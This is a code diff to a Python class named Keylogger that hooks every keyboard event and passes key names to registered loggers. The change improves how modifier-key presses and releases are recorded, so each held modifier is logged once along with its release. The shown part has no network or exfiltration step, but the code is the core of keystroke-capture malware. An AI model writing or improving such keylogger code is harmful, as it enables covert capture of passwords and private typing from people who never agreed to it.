@@ -10,6 +10,7 @@ class Keylogger:
     def __init__(self):
         self.__loggers = []
         self.__timer = None
+        self.active_modifiers = []
 
         # log each key pressed
         keyboard.hook(callback=self._on_event)
@@ -78,18 +79,26 @@ class Keylogger:
             self.log_key('.')
         else:
             # replace spaces with underscores
-            self.log_key('[{}]'.format(name.replace(' ', '_').upper()))
+            name = name.replace(' ', '_').upper()
+
+            if name not in self.active_modifiers:
+                self.active_modifiers.append(name)
+                self.log_key(f'[{name}]')
 
     def _on_keyrelease(self, event: keyboard.KeyboardEvent):
         name = event.name
 
         # skip regular letters
-        if len(name) == 1:
-            return
-        if name in ['space', 'enter']:
-            return
+        # if len(name) == 1:
+        #     return
+        # if name in ['space', 'enter']:
+        #     return
+        
+        name = name.replace(' ', '_').upper()
 
-        self.log_key('[{}-RELEASE]'.format(name.replace(' ', '_').upper()))
+        if name in self.active_modifiers:
+            self.active_modifiers.remove(name)
+            self.log_key(f'[{name}-RELEASE]')
 
     def log_key(self, text: str):
         for logger in self.__loggers:
